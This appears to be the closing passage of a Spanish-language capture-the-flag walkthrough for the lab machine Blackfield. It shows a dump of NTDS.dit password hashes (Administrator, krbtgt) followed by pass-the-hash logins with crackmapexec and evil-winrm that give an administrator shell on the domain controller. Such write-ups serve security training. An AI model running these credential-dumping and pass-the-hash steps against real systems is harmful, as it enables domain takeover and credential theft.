[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ed1f080c84ef4866f476588c45e40555:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::

```

### probamos el powned con crackmapexec y con evilwinrm

```
└─# crackmapexec winrm 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)

```

```└─# evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee' 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator

```

# LISTO :) ATT ELFOJHON
